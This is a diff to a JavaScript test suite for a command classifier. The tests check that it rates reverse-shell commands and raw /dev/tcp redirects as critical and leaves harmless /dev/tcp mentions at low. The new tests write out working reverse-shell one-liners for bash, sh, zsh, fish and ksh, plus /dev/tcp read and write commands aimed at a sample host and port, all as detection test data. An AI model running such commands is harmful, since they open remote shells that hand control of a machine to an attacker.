@@ -1252,6 +1252,55 @@ describe('classifyCommand v1.10.54 patterns', () => {
     }
   });
 
+  // (v1.10.120) reverse-shell rule was previously bash-i-only.
+  // Real attack catalog includes sh/zsh/fish/ksh wrappers plus
+  // non-interactive `bash >& /dev/tcp/...` form, plus raw FD
+  // redirection without any shell wrapper.
+  it('reverse-shell extended: sh/zsh/fish/ksh + no-i variants → critical (v1.10.120)', () => {
+    for (const cmd of [
+      'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1',  // original (regression)
+      'sh -i >& /dev/tcp/10.0.0.1/4444 0>&1',
+      'zsh -i >& /dev/tcp/10.0.0.1/4444 0>&1',
+      'fish -i >& /dev/tcp/10.0.0.1/4444 0>&1',
+      'ksh -i >& /dev/tcp/10.0.0.1/4444 0>&1',
+      'bash >& /dev/tcp/10.0.0.1/4444 0>&1',     // no -i variant
+      'sh >& /dev/tcp/10.0.0.1/4444 0>&1',
+    ]) {
+      const r = classifyCommand(cmd);
+      assert.strictEqual(r.level, 'critical', `${cmd} should be critical`);
+      assert.ok(r.reasons.some((x) => x.code === 'reverse-shell'),
+        `${cmd}: expected reverse-shell`);
+    }
+  });
+
+  it('devtcp-redirect: raw /dev/tcp FD reads/writes → critical (v1.10.120)', () => {
+    for (const cmd of [
+      'cat < /dev/tcp/10.0.0.1/4444',
+      'exec 196<>/dev/tcp/10.0.0.1/4444',
+      'echo cmd > /dev/tcp/10.0.0.1/4444',
+      'echo cmd > /dev/tcp/example.com/80',
+      '(echo >/dev/tcp/host/22) 2>/dev/null',
+    ]) {
+      const r = classifyCommand(cmd);
+      assert.strictEqual(r.level, 'critical', `${cmd} should be critical`);
+      assert.ok(r.reasons.some((x) => x.code === 'devtcp-redirect'),
+        `${cmd}: expected devtcp-redirect`);
+    }
+  });
+
+  it('devtcp-redirect — incidental "/dev/tcp" mentions stay low (regression)', () => {
+    for (const cmd of [
+      'echo /dev/tcp documentation',           // no /host/port suffix
+      'cat /etc/services | grep tcp',          // unrelated grep
+      'ls /dev/tcp',                           // listing the dir, no host/port
+      'man bash | grep dev/tcp',               // doc reference
+    ]) {
+      const r = classifyCommand(cmd);
+      assert.ok(!r.reasons.some((x) => x.code === 'devtcp-redirect'),
+        `${cmd}: should not match devtcp-redirect`);
+    }
+  });
+
   it('usermod -aG sudo / wheel / docker → high (both arg orders)', () => {
     const r1 = classifyCommand('usermod -aG sudo alice');
     assert.strictEqual(r1.level, 'high');
